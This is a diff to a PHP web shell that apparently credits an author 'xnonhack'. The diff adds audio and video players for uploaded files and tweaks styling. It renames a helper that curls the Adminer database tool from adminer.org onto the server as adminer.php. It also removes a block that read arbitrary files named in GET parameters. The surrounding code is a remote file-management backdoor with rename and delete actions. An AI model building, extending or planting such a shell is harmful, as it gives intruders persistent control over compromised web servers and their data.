@@ -385,6 +385,19 @@ if (!isset($_SESSION['login'])) {
         text-decoration: none;
         background: #efefef;
     }
+    audio {
+        outline: none;
+        width:230px;
+        border: none;
+        border-radius:5px;
+    }
+    video {
+        outline: none;
+        width:100%;
+        height: auto;
+        border: none;
+        border-radius:5px;
+    }
     textarea {
         border: 1px solid #f2f2f2;
         background: #f0f2f5;
@@ -689,6 +702,7 @@ if (!isset($_SESSION['login'])) {
     border-radius:5px;
     border:none;
     font-size: 18px;
+    font-size:15px;
     outline: none;
     background: none;
     padding:10px;
@@ -978,7 +992,7 @@ function filterTable() {
                         <span class="author">xnonhack</span>
                     </a>
                 </span>
-                <input class="search" type="text" id="Input" onkeyup="filterTable()" placeholder="Search for file.." title="Type in a name">
+                <input class="search" type="text" id="Input" onkeyup="filterTable()" placeholder="Search for files..." title="Type in a name">
                 <noscript><style>#Input{display:none}</style></noscript>
             </div>
         </div>
@@ -1519,7 +1533,7 @@ function filterTable() {
         public static function chname($filename, $newname) {
             return rename($filename, $newname);
         }
-        public static function adminer($url, $data) {
+        public static function getfile($url, $data) {
             self::$handle = fopen($data, "w");
             $ch = curl_init();
             curl_setopt($ch, CURLOPT_URL, $url);
@@ -1622,55 +1636,8 @@ function filterTable() {
             if (isset($_GET['logout'])) {
                 logout();
             }
-            $_GET['preview'] = (isset($_GET['preview'])) ? x::unhex($_GET['preview']) : false;
-            if ($_GET['preview']) {
-                $ext = strtolower(pathinfo($_GET['preview'] , PATHINFO_EXTENSION));
-                switch ($ext) {
-                    case 'jpg':
-                    case 'png':
-                    case 'jpeg':
-                    case 'bmp':
-                    case 'ico':
-                    case 'gif':
-                        print("this image ".$_GET['preview']."");
-                        break;
-                    case 'mp3':
-                    case 'ogg':
-                    case '3gp':
-                        print("this music ".$_GET['preview']."");
-                        break;
-                    case 'mp4':
-                        print("this video ".$_GET['preview']."");
-                        break;
-                    default:
-                        ?>
-                        <div class="preview">
-                            <table width="100%" class="preview">
-                                <tr>
-                                    <td class="action" colspan="3">
-                                        <span><i class="fa fa-eye" aria-hidden="true"></i> PREVIEW</span>
-                                </td>
-                                </tr>
-                                <tr>
-                                    <td>
-                                        <img src="<?= x::getimg($_GET['preview']) ?>" class="icons">
-                                        <span style="position: fixed;margin:5px;"><?= basename($_GET['preview']) ?></span>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <td>
-                                        <textarea class="preview" readonly><?= htmlspecialchars(file_get_contents($_GET['preview'])) ?></textarea>
-                                    </td>
-                                </tr>
-                            </table>
-                        </div>
-                        <?php
-                        exit();
-                        break;
-                }
-            }
             if (isset($_GET['adminer'])) {
-                if (x::adminer("https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php", "adminer.php")) {
+                if (x::getfile("https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php", "adminer.php")) {
                     print("<script>
                                 alert('<i><a class=alert href=adminer.php>adminer.php</a></i> was created')
                            </script>"
@@ -1951,6 +1918,40 @@ function filterTable() {
                                                 </div>
                                                 <center><br>
                                                     <img src="<?= str_replace($_SERVER['DOCUMENT_ROOT'], '', $file["name"]) ?>">
+                                                </center><br>
+                                                <button name="action" value="chname">
+                                                    <i class="fa fa-magic"></i>&nbsp;
+                                                    Change Name
+                                                </button>
+                                                <button name="action" value="delete">
+                                                    <i class="fa fa-times"></i>&nbsp;&nbsp;
+                                                    Delete
+                                                </button>
+                                                <input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
+                                            </form>
+                                            <?php
+                                            break;
+                                        case 'mp3':
+                                        case 'mp4':
+                                            switch (x::getextension($file['name'])) {
+                                                case 'mp3':
+                                                    $result = str_replace('mp3', 'Audio', x::getextension($file['name']));
+                                                    break;
+                                                case 'mp4':
+                                                    $result = str_replace('mp4', 'Video', x::getextension($file['name']));
+                                                    break;
+                                            }
+                                            ?>
+                                            <form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
+                                                <div class="filename">
+                                                    <span>Filename : </span>
+                                                    <?= x::w__($file['name'],
+                                                        x::sortname(2, $file['name'])) ?>
+                                                </div>
+                                                <center><br>
+                                                    <<?= $result ?> controls>
+                                                        <source src="<?= str_replace($_SERVER['DOCUMENT_ROOT'], '', $file["name"]) ?>" type="<?= $result ?>/<?= x::getextension($file['name']) ?>">
+                                                    </<?= $result ?>>
                                                 </center><br>
                                                 <button name="action" value="chname">
                                                     <i class="fa fa-magic"></i>&nbsp;
